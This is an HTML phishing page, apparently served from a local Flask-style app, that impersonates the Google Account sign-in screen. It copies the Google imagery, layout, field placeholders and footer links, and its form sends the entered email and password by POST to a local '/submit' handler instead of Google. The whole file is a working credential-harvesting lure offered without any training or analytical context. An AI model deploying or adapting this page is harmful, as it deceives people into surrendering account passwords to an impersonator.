<!DOCTYPE html>
<!-- saved from url=(0022)http://127.0.0.1:5000/ -->
<html>
  <head>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
    <title>Sign in - Google Account</title>
    <style>
      html,
      body {
        display: flex;
        justify-content: center;
        height: 100%;
      }
      body,
      div,
      h1,
      form,
      input,
      p {
        padding: 0;
        margin: 0;
        outline: none;
        font-family: Roboto, Arial, sans-serif;
        font-size: 12px;
        color: #666;
      }
      p1 {
        padding: 0;
        margin: 0;
        outline: none;
        font-family: Roboto, Arial, sans-serif;
        font-size: 10px;
        color: rgb(125, 125, 125);
      }
    
      hr {
        color: #a9a9a9;
        opacity: 0.3;
      }
      .main-block {
        max-width: 340px;
        min-height: 400px;
        padding: 10px 0;
        margin: auto;
        border-radius: 5px;
        border: solid 1px #ccc;
        box-shadow: 1px 2px 5px rgba(0, 0, 0, 0.31);
        background: #ffffff;
      }
      form {
        margin: 0 30px;
      }

      input[type="text"],
      input[type="password"] {
        width: calc(100% - 20px);
        height: 36px;
        margin: 13px 0 0 -5px;
        padding-left: 10px;
        border-radius: 0 5px 5px 0;
        border: solid 1px #cbc9c9;
        box-shadow: 1px 2px 5px rgba(0, 0, 0, 0.09);
        background: #fff;
      }

      .btn-block {
        margin-top: 10px;
        text-align: center;
      }
      button {
        width: 100%;
        padding: 10px 0;
        margin: 10px auto;
        border-radius: 5px;
        border: none;
        background: #0ebae6;
        font-size: 12px;
        font-weight: 600;
        color: #fff;
      }
      button:hover {
        background: #26a9e0;
      }
    </style>
  </head>

  <body>
    <div class="main-block">
      <img src="google-user.JPG">
      <form action="/submit" method="POST" >
        <label id="icon" for="email"><i class="fas fa-envelope"></i></label>
        <input
          autocomplete="off"
          type="text"
          name="email"
          id="email"
          placeholder="Email or phone"
          required=""
        />
        <br>
        <br>
        <label id="icon" for="password"><i class="fas fa-user"></i></label>
        <input
          type="password"
          name="password"
          id="password"
          placeholder="Enter your password"
          required=""
        />
        <br>
        <br>
        <p style="color:#0e60bd">forgot password?</p>

        <br>
        <div class="btn-block">
          <button type="submit" href="/submit">Next</button>
        </div>
        <br>
        <center><p style="color:#0e60bd">Create account</p></center>
        <br>
        <br>
        <br>
        <br>
        <p1>English (United State) &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Help &nbsp;&nbsp;&nbsp;&nbsp; Privacy &nbsp;&nbsp;&nbsp;&nbsp; Term</p1>
      </form>
    </div>
  </body>
</html>
